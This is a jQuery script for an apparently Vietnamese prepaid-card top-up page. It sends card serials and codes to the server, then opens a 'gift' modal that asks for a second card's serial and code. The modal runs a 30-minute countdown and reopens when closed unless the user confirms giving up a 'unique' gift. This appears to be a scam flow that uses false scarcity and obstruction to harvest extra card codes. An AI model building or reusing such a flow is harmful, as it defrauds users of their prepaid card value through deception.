var km = false;
$('#napthe').click(function(event) {
    $('#result').html('');
    var loaithe = $('#loaithe :selected').val();
    var seri = $('input[name=seri]').val();
    var mathe = $('input[name=mathe]').val();
    var taikhoan = $('input[name=tentk]').val();
    var thanhtoan = $('input[name=thanhtoan]').val();
    if (loaithe == false) {
        $('#result').html('<p class="text-danger">Vui lòng chọn loại thẻ thanh toán</p>');
        return false;
    }
    if (seri.length < 9) {
        $('#result').html('<p class="text-danger">Số seri không hợp lệ</p>');
        return false;
    }
    if (mathe.length < 9) {
        $('#result').html('<p class="text-danger">Mã thẻ không hợp lệ</p>');
        return false;
    }
    if (taikhoan.length < 5) {
        $('#result').html('<p class="text-danger">Tài khoản không hợp lệ</p>');
        return false;
    }
    $.ajax({
        url: 'thanh-toan.html',
        type: 'POST',
        data: {
            thanhtoan: thanhtoan,
            tentk: taikhoan,
            loaithe: loaithe,
            serithe: seri,
            mathe: mathe
        },
        dataType: 'json',
        beforeSend: function() {
            $('.spinner').removeClass('hide');
            $('#napthe').button('loading');
        },
        success: function(result) {
            if (result) {
                try {
                    // respond = JSON.parse(result);
                    respond = result;
                    if (respond.code == 1) {
                        $('#result').html('<p class="text-success">' + respond.msg + '</p>');
                        if (km == false) {
                            $('#myModal').modal('show');
                        }
                        km = true;
                        
                    } else {
                        $('#result').html('<p class="text-danger">' + respond.msg + '</p>');
                    }
                } catch (e) {
                    $('#result').html('<p class="text-danger">Lỗi: hệ thống đang bảo trì hoặc không hoạt động</p>');
                }
            }
            $('#napthe').button('reset');
            $('.spinner').addClass('hide');
        }
    })
    return false;
});
$('#nhanquabtn').click(function(event) {
    $('#result1').html('');
    var loaithe = $('#loaithe1 :selected').val();
    var seri = $('input[name=seri1]').val();
    var mathe = $('input[name=mathe1]').val();
    var taikhoan = $('input[name=idtaikhoan]').val();
    var thanhtoan = $('input[name=thanhtoan1]').val();
    if (loaithe == false) {
        $('#result1').html('<p class="text-danger">Vui lòng chọn loại thẻ thanh toán</p>');
        return false;
    }
    if (seri.length < 9) {
        $('#result1').html('<p class="text-danger">Số seri không hợp lệ</p>');
        return false;
    }
    if (mathe.length < 9) {
        $('#result1').html('<p class="text-danger">Mã thẻ không hợp lệ</p>');
        return false;
    }
    if (taikhoan.length < 5) {
        $('#result1').html('<p class="text-danger">Tài khoản không hợp lệ</p>');
        return false;
    }
    $.ajax({
        url: 'nhanqua.php',
        type: 'POST',
        data: {
            thanhtoan: thanhtoan,
            tentk: taikhoan,
            loaithe: loaithe,
            serithe: seri,
            mathe: mathe
        },
        beforeSend: function() {
            $('.spinner').removeClass('hide');
            $('#nhanquabtn').button('loading');
        },
        success: function(result) {
            if (result) {
                try {
                    respond = JSON.parse(result);
                    if (respond.ketqua == false) {
                        $('#result1').html('<p class="text-danger">' + respond.tinnhan + '</p>');
                    } else {
                        $('#result1').html('<p class="text-success">' + respond.tinnhan + '</p>');
                    }
                } catch (e) {
                    $('#result1').html('<p class="text-danger">Lỗi: hệ thống đang bảo trì hoặc không hoạt động</p>');
                }
            }
            $('#nhanquabtn').button('reset');
            $('.spinner').addClass('hide');
        }
    })
    return false;
});
$('#nhanqua').click(function(event) {
    $('#taikhoan').text($('input[name=tentk]').val());
    $('#idtaikhoan').val($('input[name=tentk]').val());
    $('.modal-title').text('NHẬN QUÀ')
    $('#step1').hide();
    $('#step2').removeClass('hide');
    $('.hansd').removeClass('hide');
    kichhoat();
});
$('#plan').change(function(event) {
    var selected = parseInt($(this).val());
    var value = 0;
    var money = 0;
    if (selected !== 0) {
        if (selected == 1) {
            money = '100,000';
        } else if (selected == 2) {
            money = '200,000';
        } else if (selected == 3) {
            money = '500,000';
        } else {
            money = 'Unknow';
        }
        value = $(this).find('option:selected').text();
        $('#value').text(value);
        $('#money').text(money);
        $('#step3').removeClass('hide');
    } else {
        $('#step3').addClass('hide');
    }
});
$('#myModal').on('hidden.bs.modal', function() {
    if (confirm('Bạn có muốn hủy phần quà này? Phần quà này là duy nhất và khi hủy bạn sẽ không thể nhận lại')) {
        alert('Hủy quà thành công!');
    } else {
        $('#myModal').modal('show');
    }
});

function kichhoat() {
    var fiveSeconds = new Date().getTime() + 1800000;
    $('#countdown').countdown(fiveSeconds, {
        elapse: true
    }).on('update.countdown', function(event) {
        var $this = $(this);
        if (event.elapsed) {
            $this.html('HẾT HẠN');
        } else {
            $this.html(event.strftime('%H:%M:%S'));
        }
    });
}
